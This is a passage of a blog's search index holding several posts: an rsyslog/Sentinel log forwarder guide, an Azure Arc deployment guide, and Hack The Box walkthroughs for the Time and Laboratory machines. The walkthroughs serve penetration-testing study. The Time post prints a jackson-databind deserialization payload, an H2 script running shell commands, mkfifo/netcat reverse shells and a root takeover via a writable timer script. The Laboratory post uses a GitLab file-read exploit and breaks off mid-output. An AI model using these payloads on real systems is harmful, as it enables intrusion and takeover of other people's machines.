Analytics while syslog messages are stored in a single column, requiring the proper parsing when inspecting the information contained on them.       Also, if you’re using the forwarder for both purposes, we need to prevent that messages sent as CEF be also stored as Syslog, which will incur in double charging for your workspace.           What are the facilities and severities, as well as message type and sources being forwarded to Sentinel?            Over sending data to Sentinel can also be costly if you don’t filter them properly.       Consider map the detection scenarios based in MITRE ATT&amp;CK Matrix Techniques you’re hunting for before sending the data. This way you can avoid sending data without a purpose to your SIEM, which won’t give you any return over the investment made in the log storage and Sentinel analytics.           What are the security requirements for this communication?            As stated in this best practice post shared by Cristhofer Romeo Muñoz, TCP should be used as default protocol for every communication due to its reliability, unless your appliance only supports UDP or if you must use encryption in this communication, adopting TLS when this data is being sent over the Internet or you might have sensitive data being sent.       Deploying the forwarder machine closer to the source also helps on reduce complexity on protocols used, as well as avoid performance issues caused by high latency between this communication.           Installation   The initial installation can be easily achieved by running the cef_installer.py from Official Github Repository using the command line below, which can be obtained for your environment by accessing the Common Event Format (CEF) connector page in Sentinel or simply by replacing the &lt;workspace id&gt; and &lt;workspace secret&gt; by yours.   :bulb: Note: If you don’t have python 2.7 in your system you might need to replace python by python3 prior to executing the line below.   sudo wget -O cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &amp;&amp; sudo python cef_installer.py &lt;workspace id&gt; &lt;workspace secret&gt;   If your forwarder machine requires a proxy for communication, you need also to update proxy settings by modifying the /etc/opt/microsoft/omsagent/proxy.conf file:   proxyconf=\"http://user:password@proxyserver:3128\" #user:password can be ignored if you proxy doesn't require authentication sudo echo $proxyconf &gt;&gt;/etc/opt/microsoft/omsagent/proxy.conf sudo chown omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf  #restart service sudo /opt/microsoft/omsagent/bin/service_control restart   This install script performs the changes below to your system. Mostly of them requires connectivity to Github once the reference configurations are located at Azure Sentinel’s official repository:      Download and install Microsoft Monitoring Agent for Linux.   Configures omsagent to listen to TCP/25226 and properly handle CEF messages by copying the file security_events.conf under workspace configuration (/etc/opt/microsoft/omsagent/&lt;workspaceID&gt;/conf/omsagent.d).   Forwards Messages matching ASA and CEF events to TCP/25226 by copying the file security-config-omsagent.conf to /etc/rsyslog.d/ or /etc/syslog-ng/conf.d/, depending on your syslog daemon.   Enables syslog daemon to listen to TCP/514 e UDP/514 for inbound communication at /etc/rsyslog.conf or /etc/syslog-ng/syslog-ng.conf   With this configuration you might be ready to forward the CEF messages to your machine, which will be sooner available in your Log Analytics workspace at CommonSecurityLog table but there are some other changes described here that you might benefit to collect also raw syslog messages, as well as implement further filtering and adjustment in this infrastructure.   Configuration   As we saw the log forwarder infrastructure is based in the syslog daemon + omsagent. As the rsyslog is one of the most popular daemons used, once it comes with most of the distributions today, I’ll be doing all configurations using it as reference, but you can easily adjust the syntax also for syslog-ng if necessary.   Rsyslog version Check and install   As stated in our docs we need to be running rsyslog v8. To confirm the running version on your system you can run the command rsyslogd -v, which will give an output like the example below:   $ rsyslogd -v rsyslogd 8.32.0, compiled with:         PLATFORM:                               x86_64-pc-linux-gnu         PLATFORM (lsb_release -d):         FEATURE_REGEXP:                         Yes         GSSAPI Kerberos 5 support:              Yes         FEATURE_DEBUG (debug build, slow code): No         32bit Atomic operations supported:      Yes         64bit Atomic operations supported:      Yes         memory allocator:                       system default         Runtime Instrumentation (slow code):    No         uuid support:                           Yes         systemd support:                        Yes         Number of Bits in RainerScript integers: 64   According to the project documentation, you should be fine running the latest version provided by your distribution repository unless some bugfix is not backported to it. In this case you might need to download the latest build provided or install from source.   Reloading rsyslog configuration   After any change made to main rsyslog configuration file (/etc/rsyslog.conf) or any other file imported by it (normally located at /etc/rsyslog.d/*.conf) you need to restart the daemon so the changes are made effective. This can be achieved by running the command below:   sudo systemctl restart rsyslog.service   Adjusting rsyslog listeners   Besides the cef_installer.py already defines a listener for TCP/514 and UDP/514, you might require additional configuration to encrypt communication using TLS.   Your configuration for TCP and UDP should look like the sample below, which is an excerpt from file /etc/rsyslog.conf:   module(load=\"imuxsock\") # provides support for local system logging #module(load=\"immark\")  # provides --MARK-- message capability  # provides UDP syslog reception module(load=\"imudp\") input(type=\"imudp\" port=\"514\")   # provides TCP syslog reception module(load=\"imtcp\") input(type=\"imtcp\" port=\"514\")   For TLS Configuration there’s some additional work required, where need to issue the certificates for servers and clients (if you’re not using an internal PKI) as well as make the required changes to rsyslog daemon to accept these encrypted communications.   More details and sample configurations can be found in official documentation at this link, from where the excerpt below was extracted to give you an idea of how this configuration looks like:   module(load=\"imuxsock\") # local messages module(load=\"imtcp\" # TCP listener     StreamDriver.Name=\"gtls\"     StreamDriver.Mode=\"1\" # run driver in TLS-only mode     StreamDriver.Authmode=\"anon\"     )  # make gtls driver the default and set certificate files global(     DefaultNetstreamDriver=\"gtls\"     DefaultNetstreamDriverCAFile=\"/path/to/contrib/gnutls/ca.pem\"     DefaultNetstreamDriverCertFile=\"/path/to/contrib/gnutls/cert.pem\"     DefaultNetstreamDriverKeyFile=\"/path/to/contrib/gnutls/key.pem\"     )      # start up listener at port 6514     input(     type=\"imtcp\"     port=\"6514\"     )   Preventing logging of remote events to local files   One point that is always requested by customers is that after configuring machines to work as forwarder for CEF and/or Syslog is that local log files (often /var/log/messages or /var/log/syslog) are being bloated with messages from remote servers, in most of the cases consuming all the available disk space in the volume where /var/log resides.   This happens because the default definitions on the service, listed below, gets some facilities and severities stored in some local files without checking the source of the events (line comments and empty removed for simplicity).   :bulb: Note: The location you can find this default configuration vary depending on your linux distribution. For Ubuntu there’s a file named /etc/rsyslog.d/50-default.conf while for RHEL based distributions (RHEL, CentOS, Fedora) it is in the main /etc/rsyslog.conf.   #Extracted from Ubuntu /etc/rsyslog.d/50-default.conf  auth,authpriv.*                 /var/log/auth.log *.*;auth,authpriv.none          -/var/log/syslog kern.*                          -/var/log/kern.log mail.*                          -/var/log/mail.log mail.err                        /var/log/mail.err *.emerg                         :omusrmsg:*   As you can see, anything that matches those severities are sent to the specified local files. A quick way to prevent this issue is to edit your configuration file to accept only messages generated by localhost (127.0.0.1):   if ($fromhost-ip == '127.0.0.1') then {     auth,authpriv.*                 /var/log/auth.log     *.*;auth,authpriv.none          -/var/log/syslog     kern.*                          -/var/log/kern.log     mail.*                          -/var/log/mail.log     mail.err                        /var/log/mail.err     *.emerg                         :omusrmsg:* }   Repeated message reduction   As remembered by my colleague Flavio Honda, Rsyslog has an option that can help you reduce repeated messages.   If you have trouble with this kind of situation or even wants to prevent this even before happen in the first time, you can enable the configuration below into your /etc/rsyslog.conf file :smile:.   $RepeatedMsgReduction on   Official reference about this feature in Rsyslog documentation can be found on this link.   Message processing flow   At rsyslog, the first file to be processed is rsyslog.conf, which normally contains an import to all *.conf inside /etc/rsyslog.d and the files are processed alphabetically. When a message arrives or is generated in the system, it is forwarded and evaluated by each setting in the same order, unless we explicitly change this behavior.   In the configuration below, let’s consider that we’re forwarding messages in CEF format from an appliance that comes with facility local4.info:         If no changes were made to rsyslog.conf or 50-default.conf to prevent logging from remote hosts, these messages will be stored in the /var/log/syslog file.   Also, if I there’s a match in 95-omsagent.conf this message will be sent to Log Analytics workspace as raw Syslog.   And finally, it will match the security-config-omsagent.conf by the regex pattern and sent as CEF to the table CommonSecurityLog.   This will not only result in full disk but also in double charging for this event, which will be stored twice in Log Analytics.   To prevent this behavior, as Ofer Shezaf shared in one of the Security Community Webinars (Log Forwarder deep dive | Filtering CEF and Syslog events), we’ll rename the file security-config-omsagent.conf to 60-cef.conf so it can be processed before 95-omsagent.conf file.   Also, we need to ensure that once the messages are forwarded to the CEF listener at TCP/25226 we’ll discard them, which can be done by the instruction stop. Stop drops the messages and they are no longer processed in the message flow.   :bulb: Note: You may find some variations of the stop instruction as a tilde (~). This came from the legacy syslogd syntax   The configuration will look like this:   $ cat /etc/rsyslog.d/60-cef.conf if ($rawmsg contains \"CEF:\") or ($rawmsg contains \"ASA-\") then {         *.*     @@127.0.0.1:25226         stop }      Adjusting 95-omsagent.conf   After the initial installation, your MMA agent will create this file located at the configuration folder of your syslog daemon (/etc/rsyslog.d/95-omsagent.conf) in sync with the settings you can define in the Azure Portal navigating to your Log Analytics workspace &gt; Agents Configuration &gt; Syslog:      For the configuration above the content of this file will look like this:   # OMS Syslog collection for workspace &lt;workspace id&gt; auth.=alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning  @127.0.0.1:25224 authpriv.=alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning  @127.0.0.1:25224 local3.=alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning  @127.0.0.1:25224 local4.=alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning  @127.0.0.1:25224   Besides this configuration is extremely easy to set through the portal, it applies globally to all your Linux systems running omsagent connected to this workspace, ingesting more information you need into your Log Analytics workspace if more data type is selected than needed.   If you need to set a different configuration to some machines like your forwarders, you are recommended to edit directly the 95-omsagent.conf by adding or removing facilities from it as well as building your own criteria to send data to Azure but we need first prevent that this file be synchronized again with the definitions in the portal.   The command below “breaks” the existing link between this file and the workspace configuration:   sudo su omsagent -c 'python /opt/microsoft/omsconfig/Scripts/OMS_MetaConfigHelper.py --disable'   The only thing that cannot be changed at 95-omsagent.conf file is the forwarding instruction to @127.0.0.1:25224.   :bulb: Note: In syslogd syntax a single at sign (@) means UDP while double at sign (@@) means TCP.   :warning: Warning: In the previously mentioned Deep Dive CEF webinar, Ofer also recommend you change the omsagent configuration to accept messages using TCP. If you follow his recommendation, you also need to adjust any forwarding instruction to double at signs in your 95-omsagent.conf file, otherwise the messages won’t be sent to Log Analytics.   Filtering out events   If you’re still noticing ingestion of unnecessary events into your workspace, you can both implement the filter in the source as well in the forwarder, which is normally easier once most of the appliances don’t support much granularity on their configurations.   An uncomplicated way to implement this is creating a file to be processed before the files 60-cef.conf and 95-omsagent.conf, in this example named 59-filter-out.conf but you can use whatever name you want but need to ensure they’ll be processed in the right order.      In this file we’ll make use again of the instruction stop, dropping the messages we don’t want to be forwarded either to Syslog or CEF. The sample below drops any messages containing “test” and matching one of the severities/facilities will be dropped.   if ($rawmsg contains \"test\") and prifilt(\"auth,authpriv.*\") then {         stop }   The rsyslog documentation is very rich on resources on how you can filter these messages as well as which properties you have available to build your instructions in a more advanced way, including tips on how to convert the instructions from syslogd syntax to the advanced, previously known as RainerScript   Hope that this information helps you to properly deploy and maintain your CEF/Syslog forwarder infrastructure in your environment!   Do you have an specific configuration or challenge in your environment not discussed here? Feel free to reach out on the comments so we can update this post in order to help others facing the same! :smile:  ","categories": ["Microsoft Sentinel"],
        "tags": ["Sentinel","Syslog","CEF","Rsyslog","Linux","Syslog Server","Syslog Forwarder","Log Collector","Log Forwarder"],
        "url": "/microsoft-sentinel/2021/03/rsyslog-sentinel-log-forwarder",
        "teaser": "https://i.imgur.com/xsbyF4T.png"
      },{
        "title": "Azure Arc enabled Servers: Deployment and Update using Configuration Manager",
        "excerpt":"In this post I’ll be guiding you through the process of deploying and updating Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM).   The process is pretty simple, but some small tips are shared to help you to make the most of this powerful configuration management solution for this task :smile:.   :information_source: Note: The scripts shared in this post can also be used from other configuration management tools, but they might require some changes to work.   Azure Arc enabled Servers   Azure Arc allows the management of physical and virtual servers not hosted on Azure to be managed through the Azure Portal console, allowing you to manage extensions, updates, and guest policies consistently, just like you can do for native Azure Virtual Machines.   Azure Arc is an important asset so you can benefit from features like Azure Defender Vulnerability Assessment, as well as deploying and managing other extensions like Microsoft Monitoring Agent (MMA) e the new Azure Monitor Agent (AMA).   Pricing   According to Azure Arc – Azure Management | Microsoft Azure, features related to the Azure control plane (installing extensions, ARM Templates, etc.) can be used at no cost, as well as the Azure Update Management.   Features related to Azure Policy Guest Configurations (Automation, Inventory, State Configuration) and other services you may be able to connect to using Arc (Azure Defender and Azure Monitor, for example) are charged according to its respective pricing table, which can be checked directly from Azure Pricing Calculator.   Pre-requisites   Some prerequisites need to be observed to make this install possible, where details can be reviewed on the link Overview of the Connected Machine agent - Azure Arc | Microsoft Docs:      A supported Operating System.   Azure Arc URLs allowed for communication, vide above-mentioned link            Depending on your environment, defining a proxy server might be required.       Some extensions you install from Arc might need additional URLs to ensure their proper functioning.           Provisioning of a Service Principal to onboard clients to Arc silently. Details of how to provision this object are described in Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs.   Enable Microsoft.HybridCompute and Microsoft.GuestConfiguration resource providers, according to Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs.   Management via Configuration Manager   If your organization already uses Configuration Manager for device management, it can be also used to install and update Azure Machine Connected Agent, which is used by Azure Arc.   Agent Install   Using Configuration Manager Applications, we can ensure that this agent is installed properly in the devices we aim to manage, getting better control of the results of the install process.   Below I describe de instructions on how to create this resource:           Download the latest release of Arc installer for Windows: The binary can be downloaded directly from the shortened URL https://aka.ms/AzureConnectedMachineAgent. The Powershell command below can be used to download and store it to a specified location.              The file needs to be stored in a File Share accessible by MECM to be used as a content source.           $destinationPath = \"c:\\path\\to\\file\" Invoke-WebRequest -Uri https://aka.ms/AzureConnectedMachineAgent -OutFile \"$destinationPath\\AzureConnectedMachineAgent.msi\"           Download and edit the Install-AzureArcMECM.ps1 script filling the variables just like the sample below. This script needs to be placed in the same directory as the *.msi we’ve just downloaded.              If your servers require a proxy for Internet communication, fill the variable $proxyUrl with its path, otherwise leave it blank.       The shared script, besides installing the agent, also configures proxy (if informed) and connects the agent to Arc service using the credentials specified:           ## Variables $installLogFile = \"c:\\Windows\\Temp\\AzureArcSetup.log\"  $tenantID = \"7482a3c1-7102-4a0d-9dfb-0aa2186ce450\" $subscriptionID = \"48a0ab65-bd82-4aac-9283-99344f387d9b\" $ResourceGroupName = \"rg-azurearc-windows\" $serviceprincipalAppID = \"909e06f7-577c-45b9-b49e-eff9e6560ef6\" $serviceprincipalSecret = \"f53f0a59-6db3-4ac7-b861-e760d29240d8\" $resourceLocation = \"eastus\" $proxyUrl = \"\" # Format: http[s]://server.fqdn:port  ### Sample data provided for illustration purposes      Create the Application from MECM console accessing Software Library &gt; Application Management &gt; Applications and selecting the option Create Application in the ribbon or on the context menu from Application.         Select the UNC path for the downloaded *.msi and click Next.         Click Next to proceed after validating the information shown about the installer used.         In General, Information, replace the preconfigured command line with the one provided below, so the install process will happen from PowerShell and hit Next.   %windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -File .\\Install-AzureArcMECM.ps1   :bulb: Tip: Fill in the other requested information for this application, which will enrich the application catalog and make it easier to administer it later.         Review all the provided information and click Next to create the resource.         After completion, the select Close for this success message.      After creating this application, we need to adjust a few details so it can work more nicely:      Access the deployment type settings by navigating to the application &gt; Deployment Types tab &gt; right-click the existing deployment and select Properties.         Under the Detection Method tab, select the option Use a custom script to detect the presence of this deployment type and click Edit.              Select the PowerShell script type and paste the snipped provided below, hitting OK to confirm.              This detection script will check not only if the agent is installed but also if it’s connected to Arc before and after the install process.              :warning: Alert: Is important that this script only return an output if the software is installed. Any output is interpreted by ConfigMgr as installed.   # Detection Method: Returns the installed version if properly installed  try{     $agentDetails = &amp; \"$env:ProgramW6432\\AzureConnectedMachineAgent\\azcmagent.exe\" show     $agentStatus = ($agentDetails | Where-Object {$_ -like '*Agent Status*'}).Split(\": \")[-1]      if($agentStatus -eq 'Connected' ){       Write-Output ($agentDetails | Where-Object {$_ -like '*Agent Version*'}).Split(\": \")[-1]     } } catch{   # Returns nothing if not installed }       On the Requirements tab, we need also to define the supported Operating System versions we’re targeting. This also avoids accidental deployments installing Arc Agent on unsupported devices, like Windows Clients.         After these final adjustments, click OK to finish the configuration.   At this moment, the Application is ready to be deployed to your servers and the process involved in this task is described in this official Microsoft reference.   Updating the agent   According to the docs, Azure Arc can be updated manually or using WSUS for Windows Operating Systems.   In this case, we can leverage ConfigMgr in both ways:           Creating another application for the newer version:              This mechanism requires more administration effort from ConfigMgr but can be achieved by duplicating the application and replacing the installation binaries.                    If you desire to proceed with this, your detection method will need to be enhanced by looking for a specific Arc Version.                       Is also important that, if you go through this path, a supersedence relation be created between these apps, as you can learn more in this link. It allows that, for the existing deployments of older versions, the latest app available be used, as well as allowing you to set the behavior for the devices where the app already installed, that can be an update or uninstall.                Add products and classifications to Software Update Catalog and manage using Software Update Management (recommended): This approach leverages the existing process in your organization using Configuration Manager to also update Azure Arc.                       The following products and classifications need to be selected and synchronized in your Software Update Point. The details on how to enable them are available on this link:                                                  Setting               Value to be selected                                                               Products               Microsoft &gt; Azure Connected Machine Agent                                         Classification               Critical Updates                                                   Conclusion   As we could see in this post, the process of using Configuration Manager for deploying and updating Azure Arc is quite simple, needing a few adjustments to do not only the install process but also the onboarding.   In the official documentation we have other deployment methods available, which can be seen in their respective articles:      Install Connected Machine agent using Windows PowerShell DSC - Azure Arc | Microsoft Docs   Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs   Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs   Hope that the shared information be useful to you, making it easier to deploy Azure Arc from ConfigMgr.   See you in the next post! :smile:  ","categories": ["Azure Arc"],
        "tags": ["Azure","Azure Arc","Hybrid Management","Windows Server","MEM","MECM","SCCM","Microsoft Endpoint Manager","ConfigMgr"],
        "url": "/azure-arc/2021/04/install-update-azure-arc-windows-configmgr",
        "teaser": "https://i.imgur.com/UXKgEpC.png"
      },{
        "title": "Walktrough: HTB Time",
        "excerpt":"Hello everyone!   The machine of this week will be Time, another Linux box medium rated from Hack The Box, created by  egotisticalSW and felamos.   :information_source: Info: Write-ups for Hack the Box are always posted as soon as machines get retired.      Enumeration   We start with the enumeration of published services using a nmap quick scan, where we can see the output below:   $ nmap -sC -sV -Pn -oA quick 10.10.10.214 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-26 16:08 -03 Nmap scan report for 10.10.10.214 Host is up (0.077s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA) |   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA) |_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds   80/TCP - HTTP Service   Starting by checking the HTTP service published on port 80, noticed that we have a JSON Validation and Beautifier service.      After some enumeration with whatweb and nikto, I haven’t found anything useful, so I proceeded to app experimentation, looking for some vulnerability that could lead us to some code injection or LFI.   Analyzing the application, we have two functionalities: Beautify and Validate:      The option beautify, after receiving a valid JSON, formats it in a pretty manner and, sending an invalid content (e.g. “test”), returns a null value.         The Validate option (in beta) checks the syntax of the JSON provided. When we send an invalid request (e.g. “test”), the exception below is returned.   Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'test': was expecting 'null', 'true', 'false' or NaN   Initial Access   After searching for com.fasterxml.jackson.core I have found about the Jackson project, developed by FasterXML and from which core is the base component for jackson-databind, a popular JSON library, here used to implement the formatting and validating features.   Looking for CVEs on jackson-databind, I have found the following for code execution published in 2019, according to the page CVE Details:      Of the 4 listed, I have found for CVE-2019-12384 a working PoC at this blog, which I have used to gain initial access to the box. The following steps were used to get a reverse shell:      Created a file called inject.sql with the code below, modified from the version at the blog, to start a reverse shell to the attacker machine at 4443 and published using a python3 HTTP server (sudo python3 -m http.server 80) from the directory where the file resides.   CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {     String[] command = {\"bash\", \"-c\", cmd};     java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\"\\\\A\");     return s.hasNext() ? s.next() : \"\";  } $$; CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f')      Configured listener using netcat by running nc -lnvp 4443.   Sent payload below in the application instead of a JSON content to be validated.   [\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {\"url\":\"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.10.10/inject.sql'\"}]         User flag   After upgrading the shell, started enumeration where was identified that the user we were using, pericles, was a regular Linux user with no special permissions granted.   pericles@time:/var/www/html$ id uid=1000(pericles) gid=1000(pericles) groups=1000(pericles)   Accessing its root directory found the user flag, as below.   pericles@time:/var/www/html$ cd ~ pericles@time:/home/pericles$ cat user.txt  &lt;redacted&gt; pericles@time:/home/pericles$    Root flag   Before continuing enumeration, to make easier regaining access if needed, created an SSH key using ssh-keygen and configured the public key in the file ~/.ssh/authorized_keys, allowing us to directly connect to the user pericles via SSH.   The enumeration was done by running linpeas.sh and one of the findings called attention, referring to the machine name: a shell file owned by pericles in the path /usr/bin/timer_backup.sh.   This file is configured as a system timer (/etc/systemd/system/timer_backup.timer and /etc/systemd/system/timer_backup.service) and set be executed every 10 seconds as root.   As we have enough permissions to edit the shell script, I have added the line below to return a reverse shell on the attacker machine and, after a few seconds, a reverse shell was obtained! :smile:   rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/g   As the process is re-executed every 10 sec the process tree is terminated, and we lose the existing connection to the machine. To just get the root flag this time is sufficient, which was as done initially.   $ nc -lnvp 4443 listening on [any] 4443 ... connect to [10.10.10.10] from (UNKNOWN) [10.10.10.214] 33304 /bin/sh: 0: can't access tty; job control turned off # id uid=0(root) gid=0(root) groups=0(root) # cat /root/root.txt &lt;redacted&gt; #         In case you want to get a persistent connection at this machine we have two initial options:      Configure the system timer to add the public key in the /root/.ssh/authorized_keys file, allowing us to SSH as root.   Spawn another reverse shell as soon as we get the initial connection, which can be done in multiple ways like Metasploit AutoRunScript and netcat, prepending the listener with the instruction to send the payload as soon as it gets connected, as you can see in an example below where the id command is executed as soon as the session is started:   printf \"id\\n\" | nc -lnvp 4443   I hope this was useful to you and see you guys in the next post! :smiley:  ","categories": ["Walkthrough"],
        "tags": ["HackTheBox","Jackson","FasterXML","Service Hijack","HTB Linux","HTB Medium"],
        "url": "/walkthrough/2021/04/htb-time",
        "teaser": "https://i.imgur.com/jiSvU4u.png"
      },{
        "title": "Walktrough: HTB Laboratory",
        "excerpt":"Hello everyone!   The machine of this week will be Laboratory, another Linux box easy rated from Hack The Box, created by 0xc45.    :information_source: Info: Write-ups for Hack the Box are always posted as soon as machines get retired.      Enumeration   As usual, we start with published services enumeration using a nmap quick scan:   $ nmap -sC -sV -Pn -oA quick 10.10.10.216                                                                    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 15:50 -03 Nmap scan report for 10.10.10.216 Host is up (0.16s latency). Not shown: 997 filtered ports PORT    STATE SERVICE  VERSION 22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA) |   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA) |_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519) 80/tcp  open  http     Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to https://laboratory.htb/ 443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: The Laboratory | ssl-cert: Subject: commonName=laboratory.htb | Subject Alternative Name: DNS:git.laboratory.htb | Not valid before: 2020-07-05T10:39:28 |_Not valid after:  2024-03-03T10:39:28 | tls-alpn:  |_  http/1.1 Service Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 33.96 seconds   After running it, noticed that besides the SSH service, 2 HTTP services (HTTP and HTTPS) were published in their default ports and the certificate for the HTTPS service mentions 2 DNS entries, which were added to the local hosts file to enumerate them properly: laboratory.htb e git.laboratory.htb.   80/TCP - HTTP Service   Accessing this service from IP and any of the DNS entries, noticed that there’s a redirection to HTTPS, which will be discussed in the next section.   443/TCP - HTTPS Service   After starting the enumeration, noticed that for each DNS entry published, we have a different service available.   https://laboratory.htb   Accessing this webpage, we have an institutional website from a company called Laboratory where Dexter, Dee Dee, and Anonymous are the employees, but nothing interesting was found during the validation.      Gobuster   To make sure that anything else is hidden on this website, started scanning using gobuster dir mode, but anything interesting was found.   $ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://laboratory.htb -x html,php,txt -k =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            https://laboratory.htb [+] Threads:        10 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] User Agent:     gobuster/3.0.1 [+] Extensions:     html,php,txt [+] Timeout:        10s =============================================================== 2021/02/18 16:12:44 Starting gobuster =============================================================== /images (Status: 301) /index.html (Status: 200) /assets (Status: 301) /CREDITS.txt (Status: 200) Progress: 38301 / 220561 (17.37%)   https://git.laboratory.htb   As the other DNS entry gave us almost nothing, decided to poke a little with the git subdomain, where we can see an instance of GitLab Server, as below.      After some research, found that API V2 would disclose some information in an unauthenticated way but this enumeration has also resulted in nothing, once the GitLab Server has an API V4 which fixes the issues found.   $ curl -L https://git.laboratory.htb/api/v3/internal/check -k                                                {\"error\":\"API V3 is no longer supported. Use API V4 instead.\"}                                                                                                                 $ curl -L https://git.laboratory.htb/api/v4/internal/check -k                                                {\"message\":\"401 Unauthorized\"}   As using the enumeration method, I found also didn’t work, decided to try creating an account on the instance and had success, besides being mandatory to use an e-mail belonging to an authorized domain (laboratory.htb) but no confirmation was required.   Once logged in with the newly created account, started browsing the public repositories where I found the SecureWebSite.      This repository belongs to the website published to https://laboratory.htb, where we would be able to get some interesting information if it weren’t a single-page application.   Once we had logon rights now to GitLab, decided to look for the server instance running, where under Help &gt; Help we could identify version 12.8.1 Community for this implementation.      Searching using searchsploit I have found some vulnerabilities that could be explored, identified as Arbitrary File Read.   $ searchsploit gitlab ----------------------------------------------------------------------- ---------------------------------  Exploit Title                                                         |  Path ----------------------------------------------------------------------- --------------------------------- GitLab - 'impersonate' Feature Privilege Escalation                    | ruby/webapps/40236.txt GitLab 11.4.7 - RCE (Authenticated)                                    | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution                                  | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated)                  | ruby/webapps/49263.py GitLab 12.9.0 - Arbitrary File Read                                    | ruby/webapps/48431.txt Gitlab 12.9.0 - Arbitrary File Read (Authenticated)                    | ruby/webapps/49076.py Gitlab 6.0 - Persistent Cross-Site Scripting                           | php/webapps/30329.sh Gitlab-shell - Code Execution (Metasploit)                             | linux/remote/34362.rb Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting      | java/webapps/47927.txt NPMJS gitlabhook 0.0.17 - 'repository' Remote Command Execution        | json/webapps/47420.txt ----------------------------------------------------------------------- --------------------------------- Shellcodes: No Results   After a few attempts I had no success with the provided scripts. Researching a little more, I came across CVE-2020-10977 in MITRE which is related to the vulnerability we’re trying to abuse and, after finding it, I found another exploit in GitHub in thewhiteh4t/cve-2020-10977: GitLab 12.9.0 Arbitrary File Read (github.com) which was later used.   With this script we were able to confirm that it is vulnerable and be able to read the /etc/passwd.   $ python3 ./cve_2020_10977.py https://git.laboratory.htb dummy P@ssw0rd                                    ----------------------------------                                                                        --- CVE-2020-10977 ---------------        --- GitLab Arbitrary File Read ---                --- 12.9.0 &amp; Below ---------------     ----------------------------------                                                                                                                                                                                  [&gt;] Found By : vakzz       [ https://hackerone.com/reports/827052 ] [&gt;] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]                                                                                                           [+] Target        : https://git.laboratory.htb                                                            [+] Username      : dummy                                                                                 [+] Password      : P@ssw0rd [+] Project Names : ProjectOne, ProjectTwo  [!] Trying to Login...          [+] Login Successful! [!] Creating ProjectOne... [+] ProjectOne Created Successfully! [!] Creating ProjectTwo... [+] ProjectTwo Created Successfully! [&gt;] Absolute Path to File : /etc/passwd [!] Creating an Issue... [+] Issue Created Successfully! [!] Moving Issue... [+] Issue Moved Successfully! [+] File URL : https://git.laboratory.htb/dummy/ProjectTwo/uploads/09bddb24c9ac93d1a011f6ed14054a66/passwd  &gt; /etc/passwd   Checking the contents of /etc/passwd we can see that the users of this box, besides root and ssh share the /var/opt/gitlab in their home paths, where we’ll look for interesting files.   $ cat etc_passwd | grep sh | awk -F\":\" '{print $6\",\"$1}' /root,root 